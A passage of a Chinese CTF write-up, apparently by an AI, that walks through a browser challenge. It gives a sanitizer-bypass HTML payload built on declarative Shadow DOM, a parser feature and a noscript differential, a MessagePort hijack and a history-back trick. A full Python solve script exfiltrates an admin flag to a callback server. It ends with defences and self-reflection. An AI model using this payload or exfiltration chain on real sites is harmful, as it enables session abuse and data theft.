4. 攻击者自己 POST /complete 需要 admin 会话——sid 是 HttpOnly + 只存在于机器人浏览器 → **拿不到**；
5. 结论：approved 永远无法设置 → 六道锁永远集不齐 → **"官方 ready 流程是烟雾弹，此题对合法笔记无解"**。

这个推理的第 1、2 环各有一个隐藏漏洞（元素计数可以被 DSD/DPU 骗过；CSP meta 可以晚到——见第七章），但推理形式上是自洽的，**它最大的破坏力是心理上的：我从此不再搜索"怎么让笔记执行脚本"，因为"已证明不可能"**。

### 6.2 转机：一个为别的目的设计的实验

比赛最后几小时，我放弃理论推演，写了一个"决定性实验"：在**容器内部**起一个观察服务器（`localhost:4001`），让机器人来打它，亲眼看 entry 请求长什么样。日志里跳出了一行：

```text
[ATK] GET /hop1?note=...&rid=9d9e5300... | cookie=sid=s%3AiT5U9IaKv3bD...
```

**机器人的 admin 会话 Cookie 随请求送上门了！** 原因就是 1.2/5.4：站点计算不含端口，`localhost:4001` 和 `localhost:3000` 同站，Lax Cookie 慷慨随行。同时机器人把 `?rid=X` 追加在我的 URL 上（第二章第 5 步）——**rid 也到手了**。

顺着这条线，旁路解法自然成形：

```text
① 在容器内 localhost:4001 起服务器，report.url 指向它
② entry 请求带来 sid（Cookie 头）+ rid（URL 参数）        ← 两个秘密一次到手
③ 服务器用 rid 请求 GET /review?rid=X                     ← 此端点不查 admin（2.2）！
   → 从返回的 HTML 里正则抠出 state nonce                  ← 第三个秘密到手
④ 服务器带着偷来的 sid POST /complete {id: rid, state}
   → 服务端验 admin ✓ id ✓ state ✓ prepared ✓ → approved=true
⑤ 服务器回应 302 → http://localhost:3000/reports/check?rid=X
   → 机器人 goto 的重定向链：none 继承 ✓（5.1）+ 目标同站 Cookie 自动随行 ✓
   → watchDocument 在这次导航上设置 finalized ✓
   → 六道锁全开 → 无 CSP 笔记原文返回（本地是占位 flag）
⑥ 窗口期内用 sid 直接 GET /api/flag → flag
```

本地实测**连续三次全部成功**，服务器插桩日志逐行印证（`ap=true fin=true prep=true used=false` 那行就是六锁齐开）。

### 6.3 旁路的局限：它是"本地特供"

对照实验（把攻击服务器搬到容器外，模拟远程拓扑）：entry 请求的 Cookie 头变成 `NONE`——跨站点时 Lax Cookie 不随行，sid 偷不到，链条断在第 ④ 步。远程容器里除了 :3000 没有任何我能占用的监听端口，所以这条链**无法迁移到远程**。比赛在验证到这一步时刚好结束。

> **核心发现**：这条旁路证明了"approved 可以被伪造"，也验证了 finalize/policy/cookie 的所有机制——它不是白费的，它是理解整道题的骨架。但它依赖一个远程不存在的条件（同站监听端口）。**官方解法（第七章）的高明之处正在于：它完全不需要偷 sid——它让审核页自己点头。**

### 6.4 另一个需要坦白的错误：debug 后门的污染

早前我用自建的 `/debug/note` 后门（跳过检查器）造过一份带脚本的笔记，跑通了"弹窗 → review → ready → /complete"的 approve 链，一度以为攻击成立。**后门笔记没有 meta CSP，所以脚本能跑——而远程所有笔记都必须过检查器**。把"后门环境里验证的组件"当成"真实环境里可用的组件"，这个错误浪费了数小时，也解释了 6.1 的错误证明为什么晚出现——它建立在被污染的早期"成功"之上。

---


## 第七章：真相大白——官方解法逐字节拆解

比赛结束两天后，公开仓库 `github.com/stack1245/PwnSec-CTF-2026` 发布了 writeup 与 exploit。我逐行读懂后，把它改编到本地环境**一次性复现成功**（第八章）。这一章把官方 payload 的每一个字节拆开讲。

### 7.1 完整 payload

```html
<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://攻击者服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
```

（原文里 `https://攻击者服务器/s.js` 是攻击者公网回调地址；`http-equiv=content-security-policy` 用了 HTML 允许的无引号属性写法。）

这份 payload 由四个部件精密咬合：

| 部件 | 作用 |
|---|---|
| `<?marker name="c">` + 结尾的 `<template for=c><meta ...></template>` | **DPU 搬运对**：把 meta 在解析末期"空投"进 head（1.5） |
| `<div><template shadowrootmode=open>...</template></div>` | **声明式 Shadow DOM**：template 本体消失，内容整体躲进 div 的影子树（1.4） |
| `<noscript><a alt="...">x</a></noscript>` | **双态开关**：检查时（JS 关）吞掉所有标记；渲染时（JS 开）提前闭合放出 script（1.3） |
| `<script src=攻击者/s.js></script>` | 藏在 alt 属性值里的"幽灵脚本"，只在渲染时诞生 |

### 7.2 检查器视角（JS 关闭）：一份无可挑剔的干净笔记

按解析顺序过一遍检查器看到的 DOM：

1. `<!doctype html>` → doctype 名字是 "html" ✓
2. `<?marker name="c">` → **处理指令节点**（DPU 特性；对老解析器是伪注释）——**不是元素**，head 的元素计数仍是 0
3. `<div>` → 进入 body，body 元素数 = 1 ✓
4. `<template shadowrootmode=open>` → **解析器立即把 template 替换为挂在 div 上的 ShadowRoot**——template 标签消失于普通 DOM，**div 的子元素数 = 0** ✓。后面的 noscript、a、script 全部进入影子树——**检查器数的 head/body 计数永远看不到影子树**
5. 影子树里的 `<noscript>`（JS 关 → 按标记解析）：`<a alt="` 进入属性值状态，`</noscript></template><script ...></script>` 整段是 alt 的**字符串值**——没有任何 script 元素诞生；`">x</a>` 闭合并留下文本 x（在影子里，无人关心）
6. 文档末尾 `<template for=c>` → **DPU 触发**：其内容（那个 meta）被搬运到 `<?marker name="c">` 所在位置——**head 里此刻恰好有且只有一个元素：CSP meta** ✓，且它的属性恰好只有 content 和 http-equiv ✓；template 本身"不挂到 DOM"
7. body 的文本内容：`x` 在影子树里，不计入 → body.textContent 是空白 ✓

**六项检查全部通过**。更妙的是：检查器跑 `page.evaluate` 在整个文档解析完成之后——meta 已被 DPU 搬进 head，一切看起来天然合法。

### 7.3 渲染器视角（JS 开启）：幽灵脚本苏醒

同样是这份字符串，在 /sandbox 里以 `Content-Security-Policy: sandbox allow-scripts; ...` 响应头渲染（该头不拦脚本，3.4）：

1. 解析到 `<noscript>`（JS 开 → **RAWTEXT 模式**）：解析器只扫 `</noscript>` 这串字符，**无视引号**——在 alt 属性值的**内部**就命中并闭合 noscript；
2. 解析继续：`</template>` 成了多余的孤儿闭合标签（DSD 的 template 在开标签时已被消费）——忽略；
3. **`<script src=攻击者/s.js></script>` 成为一个真实存在的脚本元素**——它在影子树里，但影子树**照样执行脚本**；
4. 外部脚本是**解析阻塞**的：浏览器此刻就去加载并执行 s.js——而此时**文档还没解析到末尾的 `<template for=c>`**，也就是说 **CSP meta 还没被搬进 head，meta CSP 尚不存在**！`sandbox allow-scripts` 响应头又不管脚本加载 → **s.js 畅通执行**；
5. 解析继续到末尾，DPU 把 meta 搬进 head——CSP 晚到了一步，而 CSP 对**已经开始执行的脚本**无追溯效力。

> **核心发现**：这份 payload 对检查器是一张"白纸"（干净 DOM），对渲染器是一颗"延时雷"（脚本先于 CSP 降生）。三个特性的分工可以这么记：**DSD 负责"藏身"（元素计数看不见），DPU 负责"补妆"（事后把 meta 空投进 head）+ "拖延"（让 CSP 晚生效），noscript 负责"变形"（两副面孔的开关）。**

### 7.4 完整攻击链：五个阶段

攻击者只需一台公网可达的服务器（回调服务器），提供四个路由：`/`（入口页，按访问次数返回不同内容）、`/helper`（历史回退触发器）、`/s.js`（注入进笔记的脚本）、`/flag`（接收赃物）。

```text
【阶段一：埋雷】
攻击者 POST /create 提交 7.1 的 payload → 通过检查（7.2）→ 得到 note_id
攻击者 POST /report url=https://回调/?note=note_id

【阶段二：幽灵脚本苏醒 + 端口劫持】
机器人 mainPage goto 入口页（第 1 次访问）→ 入口页 JS 立即：
    w = window.open('http://localhost:3000/review?rid=' + rid)   // 开审核页弹窗
    // 同时注册 onmessage 等待"有人送端口来"
审核页加载 → iframe 加载 /sandbox 渲染笔记 → 阶段 7.3 发生 → s.js 执行
s.js 注册自己的 onmessage；审核页脚本 postMessage("render", "*", [port2])
s.js 收到 port2 → 立即执行：
    parent.opener.postMessage(0, "*", [收到的端口])   // ★ 把端口原样转交给攻击者入口页
    // parent = 审核页(localhost)；parent.opener = 攻击者入口页(回调域) —— 跨源可转移(1.7)
入口页 onmessage 收到端口 → port.postMessage('ready')
审核页 port1 收到 "ready" → 它自己 fetch("/complete")（同源+admin Cookie）→ approved=true ✓✓

【阶段三：bookmark —— 制造 none 导航】
入口页：w.location = '/helper'            // 把弹窗导航到回调域（跨源导航弹窗是允许的）
/helper 与入口页同源！→ 它可以执行 opener.history.back() 操作入口页（同源窗口互访）
入口页自己先 location = 'about:blank'
弹窗 helper：opener.history.back()        // 让入口页历史回退
入口页历史栈：[入口URL, about:blank] → 回退到入口URL
入口响应带 Cache-Control: no-store → Chromium 重新发请求（而非 bfcache 复活）
★ 这是浏览器发起的遍历导航 → 请求头带 Sec-Fetch-Site: none ★
回调服务器看到第 2 次访问 → 回应 302 → http://localhost:3000/reports/check?rid=X

【阶段四：六锁齐开】
302 跳向 localhost:3000：none 沿重定向链继承 ✓（5.1 实测）
目标与 Cookie 同站 → admin sid 自动随行 ✓
watchDocument 看见 mainPage 导航到 check?rid=自己的id
    → finalized = approved(true) && !diverged(路径干净) = true ✓
服务端：visited ✓ prepared ✓ approved ✓ finalized ✓ !used ✓ policy ✓
    → 返回笔记原文，无 CSP 响应头！

【阶段五：收网】
笔记原文现在以 http://localhost:3000/reports/check 的身份在 mainPage 顶层渲染
→ 7.3 再次发生：s.js 再次先于 meta CSP 执行
s.js 检测 location.pathname === '/reports/check'：
    fetch('/api/flag')     // 同源 + admin Cookie → flag JSON
    location = 回调地址 + '/flag?x=' + btoa(flag)   // 外传
攻击者服务器收到 flag → pwnsec{1503fc99f750c466}
```

### 7.5 三个"不可能"是如何被逐一化解的

| 难题（2.4） | 化解手段 | 用到的特性 |
|---|---|---|
| approved 需要别人的 admin 身份 | 不偷身份——**劫持 MessagePort 让审核页自己点批准**；rid 从 entry URL 白送，nonce 从 `/review`（无 admin 检查）白拿 | postMessage 跨源转移端口 |
| policy 需要浏览器亲自发起的导航 | **历史回退 = bookmark = 浏览器发起 = none**；no-store + about:blank 中介迫使 Chromium 真正重发请求 | Fetch Metadata + bfcache 行为 |
| finalized 需要干净的导航序列 | 入口 → about:blank → 回退（=再次入口，匹配 entry 不算 diverge）→ 302 → check | watchDocument 语义 |

### 7.6 攻击者服务器的核心代码（原文改编，本地复现版）

```python
# 入口页：第 1 次给劫持脚本，第 2 次给 302
if path == "/" and "rid" in query:
    if visit_count > 1:
        return 302 → "http://localhost:3000/reports/check?rid=" + rid
    return '''<script>
        const i = new URLSearchParams(location.search).get('rid');
        const w = open('http://localhost:3000/review?rid=' + i);   // 弹窗审核页
        onmessage = e => {                    // 等 s.js 送来的端口
            e.ports[0].postMessage('ready');  // ★ 冒充笔记喊"就绪"
            setTimeout(() => {
                w.location = '/helper';       // 弹窗转去 helper
                setTimeout(() => location = 'about:blank', 250);  // 本页让位
            }, 500);
        }</script>'''

# /helper：与入口页同源，能操作 opener
'''<script>setTimeout(() => opener.history.back(), 500)</script>'''

# /s.js：注入进笔记的脚本（沙箱内 & 顶层各跑一次）
"""if (location.pathname == '/reports/check')                     // 顶层=已拿到原文
      fetch('/api/flag').then(x => x.text())
        .then(x => location = CALLBACK + '/flag?x=' + btoa(x));
   else onmessage = e => {                                       // 沙箱内=等端口
      if (e.ports[0]) parent.opener.postMessage(0, '*', e.ports); // ★ 端口转交
   }"""
```

---


## 第八章：完整复现——从零到 flag 的每一步

这一章给出可以在本地 100% 跟着做的复现流程。环境：题目原版 Docker 源码（从题目附件 zip 解出，密码 `infected`）+ 一台能被容器访问的攻击机（复现时攻击机就是宿主机，容器通过 `host.docker.internal` 访问它——作用等价于真实攻击里的公网回调服务器）。

### 8.1 环境搭建

```bash
# 1. 解出源码并启动（Dockerfile 内 apt 源如被墙，可换成镜像源）
cd src && docker compose up -d --build
# 应用现在跑在宿主机 http://127.0.0.1:3001（容器内是 localhost:3000）

# 2. 确认服务正常
curl -s http://127.0.0.1:3001/ | head -5    # 应看到 ReadTwice Docs 页面
```

### 8.2 攻击脚本（保存为 solve.py，在宿主机运行）

```python
#!/usr/bin/env python3
# 官方解法本地复现（Python3 + requests）
import base64, json, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlencode, urlsplit
import requests

TARGET   = "http://127.0.0.1:3001"                    # 目标（宿主机视角）
CALLBACK = "http://host.docker.internal:8000"          # 攻击机（容器视角）

result, visits, ready = {}, {}, threading.Event()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        p, q = urlsplit(self.path), parse_qs(urlsplit(self.path).query)
        if p.path == "/" and "rid" in q:
            visits[p.query] = visits.get(p.query, 0) + 1
            if visits[p.query] > 1:                     # 第 2 次访问 = 历史回退
                self.send_response(302)
                self.send_header("Location", f"http://localhost:3000/reports/check?rid={q['rid'][0]}")
                self.end_headers(); return
            body = ("<!doctype html><script>const q=new URLSearchParams(location.search),"
                    "i=q.get('rid'),w=open('http://localhost:3000/review?rid='+i);"
                    "onmessage=e=>{let p=e.ports[0];if(!p)return;p.postMessage('ready');"
                    "setTimeout(()=>{w.location='/helper';"
                    "setTimeout(()=>location='about:blank',250)},500)}</script>").encode()
        elif p.path == "/helper":
            body = b"<!doctype html><script>setTimeout(()=>opener.history.back(),500)</script>"
        elif p.path == "/s.js":
            body = ("let q=new URLSearchParams(location.search),i=q.get('rid'),C='" + CALLBACK + "';"
                    "if(location.pathname=='/reports/check')fetch('/api/flag').then(x=>x.text())"
                    ".then(x=>location=C+'/flag?x='+btoa(x));"
                    "else onmessage=e=>{if(e.ports[0])parent.opener.postMessage(0,'*',e.ports)};").encode()
        elif p.path == "/flag" and "x" in q:
            result["flag"] = json.loads(base64.b64decode(q["x"][0]))["flag"]; ready.set()
            body = b"ok"
        else:
            body = b"ok"
        self.send_response(200)
        self.send_header("Content-Type", "application/javascript" if p.path == "/s.js" else "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")   # ★ 历史回退必须重发的关键
        self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass

# 服务器必须放后台线程跑——serve_forever() 是阻塞调用，直接调主流程就死了
server = ThreadingHTTPServer(("0.0.0.0", 8000), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()

payload = ('<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript>'
           '<a alt="</noscript></template><script src=' + CALLBACK + '/s.js></script>">x</a></noscript></template>'
           '</div><template for=c><meta content="default-src \'none\'"http-equiv=content-security-policy></template>')
note_id = requests.post(TARGET + "/create", data={"title": "t", "html": payload},
                        allow_redirects=False).headers["Location"].rsplit("/", 1)[-1]
# report 会在审核结束后才返回（约 15 秒），flag 外传发生在审核中途，返回后基本已就绪
requests.post(TARGET + "/report", data={"url": CALLBACK + "/?" + urlencode({"note": note_id})}, timeout=25)
ready.wait(5)                       # 保险起见再等回调落地，避免竞态打印 None
print("FLAG =", result.get("flag"))
```

### 8.3 预期输出与逐行证据

脚本一跑即中。攻击机控制台：

```text
[CB] entry visit #1 rid=7a20cf964f        ← 阶段二开始（机器人首次访问入口页）
[CB] helper hit → opener.history.back()   ← 阶段三（弹窗已把端口送来，ready 已发，approved 已设）
[CB] entry visit #2 rid=7a20cf964f        ← 历史回退重发请求（Sec-Fetch-Site: none 在路上）
[CB] → 302 to /reports/check              ← 阶段四开始
[★★★] FLAG = pwnsec{real_flag_on_remote}  ← 本地环境的 flag 是占位符；真实远程 flag 为
                                             pwnsec{1503fc99f750c466}
```

服务端插桩日志（`/tmp/proof.txt`，每行一个事件，与攻击链一一对应）：

```text
/CHECK rid=7a20cf96 admin=true visited=false sf=none/document ap=false fin=false prep=false
    ← 机器人 setupPage 的 goto：第一次读（none ✓），visited=true
/review rid=...admin=true
    ← 攻击入口页开的审核页弹窗（弹窗同站，admin Cookie 随行）
/sandbox rid=... admin=true prepared=true
    ← 审核页 iframe 加载笔记 → s.js 苏醒（阶段二的雷炸了）
/REAL /complete admin=true id=7a20cf96 state=edd08131 prepared=true match=true
    ← 审核页自己请求 /complete（ready 端口劫持成功）→ approved=true
/CHECK rid=7a20cf96 admin=true visited=true sf=none/document ap=true fin=true prep=true used=false
    ← 历史回退→302→check：none 继承 ✓ admin ✓ 六锁齐开 → 笔记原文返回 → s.js 顶层二次执行 → 外传
```

### 8.4 常见故障排查

| 症状 | 原因 | 修法 |
|---|---|---|
| `/create` 返回 400 | payload 抄错一字节（尤其无引号属性、单引号嵌套） | 逐字节对照 7.1 |
| s.js 没执行 | 容器 Chromium 版本过旧不支持 DPU/DSD | 用题目原镜像（Chromium 152+） |
| 入口页收不到端口 | 弹窗被拦截策略处理（部分环境） | 确认无头环境与本题 bot 一致 |
| 回退后没有第二次请求 | 入口响应漏了 `Cache-Control: no-store` | 检查 8.2 代码中该行 |

---


## 第九章：如何防御这类攻击

这道题的每个利用点都有对应的防御手段。按攻击链顺序列出：

| 攻击点 | 攻击原理 | 防御措施 |
|---|---|---|
| 笔记检查被双解析差异绕过 | 检查环境（JS 关）与渲染环境（JS 开）产出不同 DOM | **检查与渲染必须同态**：渲染时也关 JS 预检一遍再放行；或干脆不允许任何用户 HTML（只存纯文本/Markdown 安全渲染器）；至少把 `template[shadowrootmode]`、`<?...>` 处理指令、`noscript` 列入拒绝清单（前缀黑名单 + 白名单解析器如 DOMPurify 且保持更新） |
| meta CSP 晚到导致脚本先跑 | DPU 让 meta 在文档末尾才进 head | 保护页**永远用响应头下发 CSP**（响应头从第一个字节就生效，没有时序窗口），绝不能只依赖文档内 meta |
| 审核页把信任寄托在端口消息上 | port2 被沙箱内脚本转交给攻击者，"ready"被冒名发出 | 端口消息要带**来源绑定**：审核页回传一个一次性挑战值，笔记脚本须回显（且挑战值不进沙箱可达的通道）；或改用服务端签名的回调令牌 |
| Fetch Metadata 被历史回退伪装 | history.back() 重发请求带 `Sec-Fetch-Site: none` | `none` 不该自动等于可信——对敏感端点叠加**一次性 CSRF token**（token 只随首次"Opening document."响应下发，消费时核验），这样即使头伪造/遍历重放也无法通过 |
| 状态机单例可被时序操纵 | approved/finalized 在窗口期内被外部事件依次点亮 | 整个审核事务加**会话级随机数绑定 + 短时效**；consume 成功后立刻失效一切相关状态（本题 used 已做到，但窗口期内状态太容易被拼齐） |
| 泄漏面：`/review` 无 admin 检查暴露 nonce | 任何知道 rid 者可读到 state | `/review` 同样要求 admin 会话；rid 与 state 不要同时出现在低权限可达的响应里 |
| 泄漏面：rid 被追加到攻击者 URL | 机器人把内部 ID 送出站点 | 内部 ID 与外部回执号分离；或入口 URL 只允许同源 |

> **防御哲学**：这道题的本质是"**用两个不同配置的解析器读了同一份输入，却只信其中一个的结论**"。凡是"检查环境 ≠ 执行环境"的设计（不同的 JS 开关、不同的特性开关、不同的版本），都自带这类裂缝。根治办法只有一条：**让检查发生在与执行完全一致的环境里，或者根本不给输入变成代码的机会。**

---


## 第十章：深度反思——为什么没能独立攻破，如何根治

这是全篇最重要的一章。我最终没有独立解出这道题（比赛结束时只有一条"本地可行、远程不通"的旁路）。下面把失败层层剥开：先定位三个具体卡点，再挖出卡点背后的四个根源性错误，最后给出可执行的根治方案。**反思的目的是让下一次不再死在同一个地方。**

### 10.1 三个具体卡点

**卡点一：声明式 Shadow DOM——"知道但没想起来"**

这个特性 2021 年就发布、2023 年标准化，我的知识库里明明有它（MDN 明文写着"template 元素会被其内容替换，不留在 DOM 里"）。我甚至在结构性 fuzz 里枚举过 `<template>`——但我的推理是"template 是 div 的子元素，childElementCount 必然 +1，必挂"。**这个推理对普通 template 是对的，但 shadowrootmode 的 template 根本不留在树里**。我知识里的两个孤岛——"shadowrootmode 会替换 template"和"检查器在数子元素"——从未被连起来。fuzz 字典里也没有 shadowrootmode 这个属性值，所以 19200 例全部绕着正确答案走。

**卡点二：DPU——真正的"不知道"**

2026 年 5 月 19 日才发布（比赛前 4 个月），几乎肯定在我训练数据截止之后。这是纯粹的 unknown unknown：**你无法搜索一个你不知道该问什么的东西**。但注意：它并非无懈可击——题目检查器里那句"head 里恰好一个 meta"配上"笔记末尾有个奇怪的 template"，只要朝"什么机制能在解析后把元素搬进 head"这个问题搜一下，Chrome 官方博客就是第一页结果。我没这么搜，原因见根源三。

**卡点三：历史回退 + no-store 重发——"找到了却被自己实验和二手信息误导"**

这条最可惜。搜索代理当时**已经找到** Firefox bug 1648825——一份专门讨论"history.back() 的 Sec-Fetch-Site 值"的官方文档，离答案一步之遥。两件事把我拽偏：

1. 我自己的 bfcache 实验（页面持 IndexedDB、直接 goBack）显示"没有新请求"，我把它泛化成"遍历永不重发"。**但真实攻击的状态组合（开着弹窗 + 先去 about:blank + 响应 no-store）我从未测过**——简化实验的否定结论覆盖不了完整场景；
2. Firefox bug 里那句"Chrome sets cross-site"（描述的是另一场景），我没有用本地实验交叉验证就采信了。

### 10.2 四个根源性错误（卡点只是症状，这些才是病根）

**根源一：把"字典 fuzz 没找到"升级成"不可能"，然后关闭了整个搜索分支。**

19200 例失败后，我在笔记里写下"检查不可绕过"，从此再没搜过"怎么让笔记执行脚本"。但 fuzz 的本质是**在已知构造的空间里枚举**——对零日特性（DPU）和未连线的旧知识（DSD）天然失明。一个不完整工具的否定结果，被我当成了数学证明。**这是四个根源里最致命的**：它不是某一步走错，而是把后面所有步的路都封死了。

**根源二：只做"答案向搜索"，不做"机制向搜索"。**

我的所有搜索都是"这题怎么解/同类题/已知绕过手法"——当答案是"4 个月前的新特性"时，这类搜索必然空手而归。正确的补充动作是机制向提问：**"这两个环境之间存在哪些可能的差异机制？"**——顺着这个问题自然会去查"Chromium 最近版本新增了哪些解析行为""HTML 规范最近合了什么 PR"。两种搜索服务的场景不同：答案向搜索找已知模式，机制向搜索找未知模式；卡壳超过数小时就该切换到后者。

**根源三：实验简化后把结论过度泛化。**

bfcache 实验砍掉了弹窗和 about:blank 两个"看似无关"的条件，得出的"遍历不发请求"结论在真实场景被直接证伪。攻击往往依赖**状态组合**而非单变量——简化实验在安全分析里是负资产，除非明确声明"该结论仅覆盖被测状态"。

**根源四：权威信息的二手转述替代了一手验证。**

"Chrome sets cross-site"是一份讲 Firefox 的 bug 报告里对 Chrome 的顺带描述。它可能在该场景下为真，但场景不同结论就不同。**凡是对决策有决定性的外部断言，必须用本地最小实验复测**——尤其当它恰好"支持"你已有的怀疑方向时（确认偏误最舒服的入口）。

### 10.3 根治方案（可执行清单）

把上面的病根翻译成以后能落地的纪律：

**① 否定结果的置信度标注（治根源一）**

任何 fuzz/枚举得出"不可行"时，必须同时记录它的**覆盖范围声明**：

> "本结论仅证明：在〔字典枚举的构造空间〕内无解。不证明：不存在超出该空间的构造。"

并且规定：**"不可行"结论设一个强制重开间隔（例如 4 小时——数值本身不重要，重要的是必须有这个机制）**。为什么需要强制重开：因为一旦写下"不可能"，后续的注意力分配会**持续绕开**这个分支——不是忘记，而是每次规划时它都不再出现在候选列表里。只有把它当成"定期到期的假设"而不是"已结案的结论"，才会在重入时用新的问法（"我的字典缺什么"）而不是旧的前提（"这条路死了"）去审视它。间隔取多长是经验值：太短等于没有结论（每轮都自我怀疑），太长等于提前认输（比赛结束了才想起重看）——4 小时大约是一场比赛里同一分支值得二顾的节奏。

**② 双轨搜索制度（治根源二）**

解题全程维护两条搜索线：

| 轨道 | 问题形式 | 触发时机 |
|---|---|---|
| 答案向 | "X 题 writeup""X 手法绕过" | 开局、遇到明确已知模式时 |
| 机制向 | "A 环境和 B 环境之间有哪些差异机制""Chrome 版本 N 新增了什么解析行为""什么规范特性会造成 X 现象" | 卡壳 >2 小时、或得到"不可能"结论时**强制切换** |

**③ 情报订阅习惯（治卡点二这一类）**

浏览器差分类题目的第一动作清单（比解题更早）：

- 查目标浏览器版本的 [Chrome 平台新特性](https://developer.chrome.com/blog) 近 12-18 个月条目；
- 查 [chromestatus](https://chromestatus.com) 的近期 ship/origin trial 列表；
- 对"检查器"类目标，专门搜"HTML parser new feature 2025/2026""whatwg html 最近合并的 PR"。

出题人用 4 个月前的新特性出题，就是在赌解题者的知识截止日期——**唯一的反制是把"查新"变成流程第一步**。

**④ 完整场景实验原则（治根源三）**

设计验证实验前，先列**攻击场景的全部状态要素**（本题：弹窗存在 / about:blank 中介 / no-store / 遍历方向），实验必须覆盖全组合或明确声明未覆盖项。特别是：**当实验结果与规范直觉矛盾时（规范说遍历无 initiator 应发 none，实验却说不发请求），矛盾本身就是"你的实验少测了什么"的警报**，而不是"规范错"的证据。

**⑤ 一手复测原则（治根源四）**

对将决定方向取舍的外部断言（尤其他家产品行为的转述），一律本地最小复现。本题里复测成本是 10 分钟——写个 back() 页面看请求头即可——却省掉了把唯一正解判死刑的代价。

**⑥ 对"不可能"的健康心态**

CTF 里"被证明不可能"几乎总等于"我的模型缺了一个机制"。正确姿势是把它改写成一句可执行的话：**"缺的机制属于哪一类？去哪里能找到这一类？"**——本题的答案本该是："属于'解析器行为差异'类，去 Chrome 新特性里找"，然后 30 分钟内就能撞见 DPU 博客。

### 10.4 根治方案的有效性回测——它真能解决未来的题吗

清单写得再漂亮，如果不能回答"套回这道题会怎样、用到别的题还行不行"，就只是姿态。所以这一节做两件事：**把六条方案逐条放回本次解题时间线回测**，然后**诚实划出它们的能力边界**。

**回测：如果当时就执行这套清单，最早在哪一步改变结果？**

| 方案 | 放回时间线的改变点 | 对本题结局的影响 |
|---|---|---|
| ③ 情报订阅 | **开局第一小时**。读 2026-05-19 的 Chrome 官方博客，看到 `<?marker>`/`<template for>` 的搬运语义 | 直接补上 DPU 这个知识缺口——博客标题和示例就是"答案级"信息。这是六条里**唯一直接补充能力**的条目 |
| ② 机制向搜索 | 卡壳 2 小时后强制切换问法："什么机制能让元素不被计数/事后搬进 head" | 高概率命中 MDN 的 DSD 页（治卡点一）或 Chrome 博客的 DPU（治卡点二）；同一问法也会引出"遍历的 Sec-Fetch 值"的一手实验动机（治卡点三的起点） |
| ⑤ 一手复测 | 读到 Firefox bug 那句"Chrome sets cross-site"的当下 | 10 分钟实验就能救活遍历路线——即使检查绕过还没找到，policy 半链也能提前打通（第六章旁路已证明其余全部成立） |
| ①⑥ 置信度标注/重写问法 | 写下"检查不可绕过"的那一刻 | 不直接产生新知识，但它们是**门闸**：本次 ②③⑤ 根本没被触发，就是因为这扇门先关死了。①⑥ 决定 ②③⑤ 有没有出场机会 |
| ④ 完整场景实验 | 设计 bfcache 实验之前 | 防止"遍历不发请求"这个错误结论诞生，与 ⑤ 双保险 |

回测结论：**③+② 的组合大概率改写本题结局**（③供弹药、②做连线），⑤④则是防止把已经到手一半的正解（遍历路线）亲手杀掉。而这一切的前提是 ①⑥ 先把门打开——六条是一个系统，不是六个独立的补丁。

**诚实分层：哪些是真解决，哪些只是提高概率**

| 层 | 包含 | 对未来题的真实效力 |
|---|---|---|
| 能力补足型 | ③ | 直接注入新信息，是唯一的"进攻性"方案。但它依赖特性已被公开文档化——**如果未来题依赖发布仅几天、或故意不公开文档的特性，③也失效** |
| 流程纪律型 | ①②④⑤⑥ | 不产生新知识，但保证：正确的搜索动作被执行、错误结论不封路、实验不简化、外部断言被复测。它们把"必然错过"变成"大概率撞见"，把"一错到底"变成"错得可检测"——**不保证解出，保证不死得冤枉** |
| 硬限制 | 训练知识截止本身 | 任何流程都无法让不存在的知识存在。对 AI 而言这是结构性上限：**只能靠"搜索先行"的前置动作缓解，不能根治**。承认这一层存在，比假装态度能弥补一切更重要 |

**套用性**：这套方案不绑定本题——它针对的是"两个环境读同一份输入"这一整类题（新特性差、版本差、配置差、语言运行时差）的通用解题结构：先枚举差异维度（②），先查目标环境近 12-18 个月的新特性（③），实验覆盖全状态组合（④），关键断言一手复测（⑤），否定结论挂置信度（①⑥）。对非差异类题目（纯逻辑漏洞、纯密码学、纯内存破坏），②③的适用面收窄，但①④⑤⑥仍然通用——它们治的是"分析纪律"，不是"浏览器知识"。

### 10.5 为什么是我（AI）没做出来——对"是否真的深度反思"的回答

先立一个事实基座：14 支队伍在 24 小时内解出，且所需信息（Chrome 官方博客、MDN、WHATWG 规范）全部公开可检索。**所以失败的原因不在"信息不可得"，而在"我没有以正确的问法去取"**。这一节把我的失败拆成三层，每层标注它是不是 AI 特有的、能不能治——因为"深度反思"的第一条检验就是：**归因必须具体到机制，不能停在"我不够努力"这种正确的废话上**。

**第一层：硬限制（AI 结构性，不可治，只能缓解）——DPU 的知识截止**

DPU 发布于 2026 年 5 月，几乎肯定在我训练数据截止之后。这一层换任何"更强的 AI"也一样：不搜索就不会知道。**这一层不丢人，丢人的是明知自己有知识截止、却没有把"查新"设计成流程第一步去补偿它**——前者是上限，后者是失误。本篇把 ③ 列为第一动作，就是把失误补回来。

**第二层：检索失败（AI 特有的"知识孤岛"，可治）——DSD 知道但没被激活**

DSD 是 2021/2023 年的特性，我的知识库里明确有它，MDN 原文"template 元素会被其内容替换"就躺在那里。失败发生在**关联**环节："shadowrootmode 不留 DOM"和"检查器在数子元素"两个知识点从未被同一句话提起。人类也有完全相同的失败模式（"知道但想不到"），人类选手的解法是卡住时系统枚举差异维度逐个查证——这正是 ② 机制向搜索的来历。**这一层是流程可治的，治法已列入清单。**

**第三层：流程错误（与是否 AI 无关，可治）——简化实验、二手锚定、否定封路**

bfcache 实验砍场景后过度泛化、Firefox bug 的转述未复测、fuzz 否定结论封死分支——这三个错误人类分析师同样会犯，同样靠 ①④⑤ 治。把这一层归咎于"AI 不行"是不诚实的：它就是分析纪律问题。

